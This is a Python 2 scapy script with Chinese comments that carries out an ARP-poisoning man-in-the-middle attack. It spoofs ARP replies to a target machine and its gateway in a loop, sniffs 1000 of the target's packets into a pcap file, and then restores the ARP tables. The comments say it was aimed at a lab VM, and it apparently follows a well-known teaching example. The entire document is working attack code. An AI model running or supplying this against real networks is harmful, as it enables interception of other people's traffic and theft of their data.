#coding=utf-8
from scapy.all import *
import os
import sys
import threading

interface   = "eth0"              #要嗅探的網卡
target_ip   = "10.10.10.130"      #目標ip,這裡測試的是另外一台虛擬機win7
gateway_ip  = "10.10.10.2"        #網關ip，這裡是虛擬機的網關
packet_count = 1000
poisoning    = True

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    # 以下代碼調用send函數的方式稍有不同
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

def get_mac(ip_address):
    # srp函數（發送和接收數據包，發送指定ARP請求到指定IP地址,然後從返回的數據中獲取目標ip的mac）
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    #　返回從響應數據中獲取的MAC地址
    for s,r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning

    # 構建欺騙目標的ARP請求()，這裡沒設置hwsrc,默認就是本機咯
    # 簡單來說：告訴被攻擊機器，本機（攻擊機）的mac是網關，就是攻擊者的機器是網關
    poison_target = ARP()
    poison_target.op = 2                # 響應報文
    poison_target.psrc = gateway_ip     # 模擬是網關發出的, 其實是我們的機器發出的
    poison_target.pdst = target_ip      # 目的地是目標機器
    poison_target.hwdst = target_mac    # 目標的物理地址是目標機器的mac

    # 構建欺騙網關的ARP請求()，這裡沒設置hwsrc,默認就是本機咯
    poison_gateway = ARP()
    poison_gateway.op = 2               # 響應報文
    poison_gateway.psrc = target_ip     # 模擬是目標機器發出的,
    poison_gateway.pdst = gateway_ip    # 目的地是網關
    poison_gateway.hwdst = gateway_mac  # 目標的物理地址是網關的mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while poisoning:
        # 開始發送ARP欺騙包(投毒)
        send(poison_target)
        send(poison_gateway)
        # 停兩秒
        time.sleep(2)

    print "[*] ARP poison attack finished."

    return

# 設置嗅探的網卡
conf.iface = interface

# 關閉輸出
conf.verb  = 0

print "[*] Setting up %s" % interface
# 獲取網關mac
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
# 獲取目標(被攻擊的機器)mac
target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)

# 啟動ARP投毒（欺騙）線程
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter  = "ip host %s" % target_ip  # 過濾器
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

except KeyboardInterrupt:
    pass

finally:
    # 將捕獲到的數據包輸出到文件
    print "[*] Writing packets to arper.pcap"
    wrpcap('arper.pcap',packets)

    poisoning = False

    # 等待投毒進程退出
    time.sleep(2)

    # 還原網絡配置
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)